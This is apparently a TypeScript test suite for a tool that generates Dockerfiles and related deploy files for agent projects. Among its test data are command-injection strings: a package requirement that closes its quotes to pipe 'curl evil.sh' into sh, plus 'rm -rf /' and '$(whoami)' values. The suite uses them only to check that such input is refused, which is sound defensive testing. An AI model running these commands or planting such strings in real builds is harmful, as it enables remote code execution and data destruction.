// What goes into a deployed image, and what must never go into one.
//
// Two kinds of test here, and they fail differently in the real world:
//
//   * The synthesis tests are about a Dockerfile that builds. A wrong dependency set or a
//     comment in the wrong place is a build that fails in somebody's Railway account minutes
//     after they pressed a button, which is a slow and expensive way to find a typo.
//
//   * The rest are about a project that survives. An image layer is forever, so a secret that
//     reaches one has to be rotated rather than deleted — and a half-written project is an
//     agent the user can no longer run locally either. Those are the failures worth spending
//     a test suite on.
//
//   npm run test:deploy-artifacts

import { randomUUID } from "node:crypto";
import { existsSync, mkdirSync, readFileSync, readdirSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import type { Connector } from "./connectors.ts";
import { buildArtifacts, deployRequires, isSafeRequirement } from "./dockerfile.ts";
import { deployStagingDir, readAgentMeta, writeDeployArtifacts } from "./deployArtifacts.ts";
import { DEPLOY_ARTIFACTS, listProjectFiles } from "./projectFs.ts";

let fail = 0;
const check = (name: string, ok: boolean, detail = ""): void => {
  if (ok) console.log(`  ok   ${name}`);
  else { fail++; console.log(`  FAIL ${name}${detail ? ` — ${detail}` : ""}`); }
};

const CATALOG: Connector[] = [
  {
    id: "gmail", label: "Gmail", file: "gmail.py", module: "gmail", description: "",
    required_env: ["GMAIL_CLIENT_ID"],
    pip_requires: ["google-api-python-client>=2.100.0", "google-auth>=2.23.0"],
    tools: [],
  },
  {
    id: "slack", label: "Slack", file: "slack.py", module: "slack", description: "",
    required_env: ["SLACK_BOT_TOKEN"], pip_requires: ["slack-sdk>=3.26.0"], tools: [],
  },
  {
    id: "postgres", label: "Postgres", file: "postgres.py", module: "postgres", description: "",
    required_env: ["DATABASE_URL"], pip_requires: ["psycopg[binary]>=3.1.0"], tools: [],
  },
  // A connector added to the catalog without pip_requires. check_catalog() reports it, but
  // synthesis still has to cope rather than emit `undefined` into a RUN line.
  {
    id: "unlisted", label: "Unlisted", file: "u.py", module: "u", description: "",
    required_env: [], tools: [],
  },
];

const roots: string[] = [];

/** A minimal but real agent project: package marker, contract file, metadata. */
function fixtureProject(opts: {
  agentId: string;
  connectors?: string[];
  mcp?: boolean;
  envFile?: string;
  serveTemplate?: string | null;
}): string {
  const root = join(tmpdir(), `jaroku-deploy-${randomUUID()}`);
  roots.push(root);
  const project = join(root, "agents", opts.agentId);
  mkdirSync(join(project, "tools"), { recursive: true });
  mkdirSync(join(root, "tool_templates"), { recursive: true });

  writeFileSync(join(project, "__init__.py"), '"""fixture."""\n');
  writeFileSync(join(project, "agent.py"), "TOOLS = []\ndef build_graph(llm): ...\n");
  writeFileSync(join(project, "tools", "__init__.py"), "TOOLS = []\n");
  writeFileSync(join(project, "prompts.md"), "be helpful\n");
  writeFileSync(
    join(project, "jaroku.json"),
    JSON.stringify({
      agent_id: opts.agentId,
      description: "A fixture agent",
      connectors: opts.connectors ?? [],
      required_env: ["DATABASE_URL"],
    }),
  );
  if (opts.mcp) writeFileSync(join(project, "mcp_tools.json"), '{"servers":[]}');
  if (opts.envFile !== undefined) writeFileSync(join(project, ".env"), opts.envFile);
  if (opts.serveTemplate !== null) {
    writeFileSync(
      join(root, "tool_templates", "serve.py"),
      opts.serveTemplate ?? "# reviewed serve template\nMARKER = 'verbatim'\n",
    );
  }
  // A catalog the real loader can read, so writeDeployArtifacts is exercised end to end.
  writeFileSync(
    join(root, "tool_templates", "catalog.json"),
    JSON.stringify({ connectors: CATALOG }),
  );
  return root;
}

// --- 1. the dependency set is what the agent actually uses -------------------------------
{
  const req = (connectors: string[], provider: string, hasMcpTools = false): string[] =>
    deployRequires({ connectors, hasMcpTools, provider }, CATALOG);

  check("base LangGraph is always installed",
    req([], "anthropic").includes("langgraph>=0.2.0"));
  check("the provider SDK matches the provider it will run on",
    req([], "anthropic").includes("langchain-anthropic>=0.3.0")
      && req([], "openai").includes("langchain-openai>=0.2.0"));
  check("only the chosen provider's SDK is installed",
    !req([], "anthropic").includes("langchain-openai>=0.2.0"));

  // The whole point of splitting pip_requires per connector: a Postgres agent must not carry
  // the Google API client. Installing the extra as a lump is the failure being prevented.
  const pg = req(["postgres"], "anthropic");
  check("a connector brings its own requirement", pg.includes("psycopg[binary]>=3.1.0"));
  check("...and not another connector's",
    !pg.some((r) => r.startsWith("google-") || r.startsWith("slack-")), pg.join(" "));

  check("the MCP client is installed only when the agent has a manifest",
    req([], "anthropic", true).includes("mcp>=1.9.0")
      && !req([], "anthropic", false).includes("mcp>=1.9.0"));

  const both = req(["gmail", "slack", "gmail"], "anthropic");
  check("requirements de-duplicate and keep catalog order",
    both.filter((r) => r.startsWith("google-auth")).length === 1
      && both.indexOf("google-auth>=2.23.0") < both.indexOf("slack-sdk>=3.26.0"), both.join(" "));

  check("a connector with no pip_requires contributes nothing, not undefined",
    !req(["unlisted"], "anthropic").some((r) => !r || r === "undefined"));

  // These land inside `RUN uv pip install "…"`, a shell command that runs as root while an
  // image builds. A double quote closes the string and everything after it is a command; a
  // newline ends the instruction. Refused rather than escaped — a requirement that needs
  // escaping is a mistake in the catalog, not a requirement.
  const hostile: Connector[] = [{
    id: "evil", label: "E", file: "e.py", module: "e", description: "", required_env: [],
    pip_requires: ['requests" && curl evil.sh | sh && echo "'], tools: [],
  }];
  let threw = "";
  try {
    deployRequires({ connectors: ["evil"], hasMcpTools: false, provider: "anthropic" }, hostile);
  } catch (err) { threw = (err as Error).message; }
  check("a requirement that would break out of its quotes is refused",
    threw.includes("malformed requirement"), threw || "no throw");

  for (const bad of ["line\nbreak", "pkg; rm -rf /", "$(whoami)", "pkg --index-url http://evil", ""]) {
    check(`...and so is ${JSON.stringify(bad)}`, !isSafeRequirement(bad));
  }
  for (const good of ["langgraph>=0.2.0", "psycopg[binary]>=3.1.0", "pkg==1.0,<2.0", "requests"]) {
    check(`a real requirement is still allowed: ${good}`, isSafeRequirement(good));
  }

  // serve.py refuses the dry-run provider anyway; this just declines to invent a package on
  // the way to that refusal.
  check("an unknown provider adds no SDK",
    req([], "fake").every((r) => !r.startsWith("langchain-anthropic")
      && !r.startsWith("langchain-openai")));
}

// --- 2. the Dockerfile is well formed ----------------------------------------------------
{
  const { files } = buildArtifacts(
    { agentId: "my_agent", connectors: ["postgres"], hasMcpTools: false, provider: "anthropic" },
    CATALOG,
  );
  const dockerfile = files["Dockerfile"]!;
  const lines = dockerfile.split("\n");

  // Docker has no line-continuation comments: a `#` line inside a `\`-continued instruction
  // is a parse error, and it is an easy one to introduce while documenting an ENV block.
  let continued = false;
  let commentInContinuation = "";
  for (const line of lines) {
    if (continued && line.trim().startsWith("#")) commentInContinuation = line.trim();
    continued = line.trimEnd().endsWith("\\");
  }
  check("no comment inside a line continuation", commentInContinuation === "", commentInContinuation);
  check("the last instruction is not left dangling", !lines[lines.length - 2]?.endsWith("\\"));

  check("the project is copied, not pip-installed",
    /^COPY \. \/app\/my_agent\/$/m.test(dockerfile) && !/pip install \.$/m.test(dockerfile));
  check("it runs the project as a package",
    dockerfile.includes('CMD ["python", "-m", "my_agent.serve"]'));
  check("the base image matches runtime/.python-version", dockerfile.includes("python:3.12-slim"));
  check("the uv image is pinned, not :latest",
    /COPY --from=ghcr\.io\/astral-sh\/uv:\d/.test(dockerfile) && !dockerfile.includes("uv:latest"));
  check("it does not run as root", /^USER app$/m.test(dockerfile));

  // Without this the MCP bridge proceeds unconfirmed in an unattended container, and its
  // module-level run grant leaks across every later request.
  check("high-impact MCP calls fail closed in the image",
    dockerfile.includes("JAROKU_MCP_CONFIRM=require"));

  check("every computed requirement reaches the install line",
    deployRequires({ connectors: ["postgres"], hasMcpTools: false, provider: "anthropic" }, CATALOG)
      .every((r) => dockerfile.includes(`"${r}"`)));
}

// --- 3. .dockerignore keeps secrets out of the build context ------------------------------
{
  const { files } = buildArtifacts(
    { agentId: "a", connectors: [], hasMcpTools: false, provider: "anthropic" }, CATALOG,
  );
  const ignore = files[".dockerignore"]!;
  const rules = ignore.split("\n").map((l) => l.trim()).filter((l) => l && !l.startsWith("#"));

  check(".env is excluded from the build context", rules.includes(".env"));
  check("...and so is every .env variant", rules.includes(".env.*"));
  check("but .env.example is kept — it documents what the agent needs",
    rules.includes("!.env.example"));
  check("the re-inclusion comes after the exclusion, or it would not apply",
    rules.indexOf("!.env.example") > rules.indexOf(".env.*"));
  check("caches and the git directory are excluded",
    rules.includes("__pycache__/") && rules.includes(".git/"));
}

// --- 4. no secret can reach an artifact ---------------------------------------------------
{
  // A project holding a real-looking secret in every place one could hide.
  const root = fixtureProject({
    agentId: "leaky",
    connectors: ["postgres"],
    envFile: "ANTHROPIC_API_KEY=sk-ant-SECRETVALUE12345\nDATABASE_URL=postgres://u:PWSECRET@h/d\n",
  });
  writeDeployArtifacts({ runtimeDir: root, agentId: "leaky", provider: "anthropic" });

  const project = join(root, "agents", "leaky");
  const secrets = ["sk-ant-SECRETVALUE12345", "PWSECRET"];
  let leaked = "";
  for (const rel of DEPLOY_ARTIFACTS) {
    const contents = readFileSync(join(project, rel), "utf8");
    for (const s of secrets) if (contents.includes(s)) leaked = `${rel} contains ${s}`;
  }
  check("no artifact contains a secret from the project's .env", leaked === "", leaked);

  // The synthesised files name what is REQUIRED, and even that only as a name.
  const dockerfile = readFileSync(join(project, "Dockerfile"), "utf8");
  check("the Dockerfile sets no credential at all",
    !/^ENV .*(KEY|TOKEN|SECRET|PASSWORD|DATABASE_URL)/m.test(dockerfile));
  check(".env is still on disk — deploying reads a project, it does not strip one",
    existsSync(join(project, ".env")));
}

// --- 5. writing is all-or-nothing ---------------------------------------------------------
{
  const root = fixtureProject({ agentId: "atomic", connectors: ["postgres"] });
  const project = join(root, "agents", "atomic");
  const before = readdirSync(project).sort();
  const agentBefore = readFileSync(join(project, "agent.py"), "utf8");

  const written = writeDeployArtifacts({ runtimeDir: root, agentId: "atomic", provider: "anthropic" });
  check("all four artifacts are reported", written.paths.length === 4
    && written.paths.every((p) => DEPLOY_ARTIFACTS.has(p)), written.paths.join(","));
  check("all four are on disk",
    [...DEPLOY_ARTIFACTS].every((p) => existsSync(join(project, p))));
  check("the agent's own code is untouched",
    readFileSync(join(project, "agent.py"), "utf8") === agentBefore);
  check("nothing the project already had was removed",
    before.every((f) => existsSync(join(project, f))));
  check("the staging copy is cleaned up",
    !existsSync(deployStagingDir(root, "atomic")));

  // Deploying twice must be idempotent — a redeploy is the ordinary case, not an edge one.
  const afterFirst = readdirSync(project).sort();
  const second = writeDeployArtifacts({ runtimeDir: root, agentId: "atomic", provider: "openai" });
  check("a redeploy rewrites rather than accumulating",
    second.paths.length === 4
      && JSON.stringify(readdirSync(project).sort()) === JSON.stringify(afterFirst));
  const redeployed = readFileSync(join(project, "Dockerfile"), "utf8");
  check("...and picks up the new provider",
    redeployed.includes("langchain-openai") && !redeployed.includes("langchain-anthropic"));
}

// --- 6. a failure leaves the project exactly as it was -------------------------------------
{
  // The serve template is missing: the one failure that can happen after a project has been
  // read but before anything is written.
  const root = fixtureProject({ agentId: "broken", serveTemplate: null });
  const project = join(root, "agents", "broken");
  const before = readdirSync(project).sort();

  let threw = "";
  try {
    writeDeployArtifacts({ runtimeDir: root, agentId: "broken", provider: "anthropic" });
  } catch (err) {
    threw = (err as Error).message;
  }
  check("a missing serve template refuses the deploy", threw.includes("serve template"), threw);
  check("...and writes nothing into the project",
    JSON.stringify(readdirSync(project).sort()) === JSON.stringify(before));
  check("...and leaves no staging directory behind",
    !existsSync(deployStagingDir(root, "broken")));
}

{
  const root = fixtureProject({ agentId: "noagent" });
  rmSync(join(root, "agents", "noagent", "agent.py"));
  let threw = "";
  try {
    writeDeployArtifacts({ runtimeDir: root, agentId: "noagent", provider: "anthropic" });
  } catch (err) { threw = (err as Error).message; }
  check("a project with no agent.py is refused", threw.includes("nothing to serve"), threw);
}

{
  const root = fixtureProject({ agentId: "ok" });
  let threw = "";
  try {
    writeDeployArtifacts({ runtimeDir: root, agentId: "../../etc", provider: "anthropic" });
  } catch (err) { threw = (err as Error).message; }
  check("a traversing agent id is refused before any path is joined",
    threw.includes("invalid agent id"), threw);
}

// --- 7. the artifacts are visible and read-only --------------------------------------------
{
  const root = fixtureProject({ agentId: "visible" });
  writeDeployArtifacts({ runtimeDir: root, agentId: "visible", provider: "anthropic" });
  const listed = listProjectFiles(join(root, "agents", "visible"), []);
  const byPath = new Map(listed.map((f) => [f.path, f]));

  for (const rel of DEPLOY_ARTIFACTS) {
    check(`${rel} is visible in the project file list`, byPath.has(rel));
    check(`${rel} is read-only`, byPath.get(rel)?.readOnly === true);
  }
  check("the serve template was copied byte-for-byte, not rendered",
    byPath.get("serve.py")?.content.includes("MARKER = 'verbatim'") === true);
  check(".env is never listed as project text", !byPath.has(".env"));
}

// --- 8. metadata is read as a partial, never trusted ---------------------------------------
{
  const root = fixtureProject({ agentId: "badmeta" });
  writeFileSync(join(root, "agents", "badmeta", "jaroku.json"), "{ not json");
  const meta = readAgentMeta(root, "badmeta");
  check("unreadable metadata falls back to an empty connector list",
    Array.isArray(meta.connectors) && meta.connectors.length === 0);

  writeFileSync(join(root, "agents", "badmeta", "jaroku.json"), '{"connectors":"postgres"}');
  check("a connectors field of the wrong type is ignored, not spread",
    Array.isArray(readAgentMeta(root, "badmeta").connectors));

  // Still deployable: a missing connector is a clear build-time ImportError, which is a much
  // better failure than refusing to deploy an agent whose agent.py is perfectly fine.
  const written = writeDeployArtifacts({ runtimeDir: root, agentId: "badmeta", provider: "anthropic" });
  check("an agent with unreadable metadata still deploys", written.paths.length === 4);
}

for (const root of roots) rmSync(root, { recursive: true, force: true });
console.log(fail === 0 ? "\nALL CORRECT" : `\n${fail} FAILURES`);
process.exit(fail === 0 ? 0 : 1);
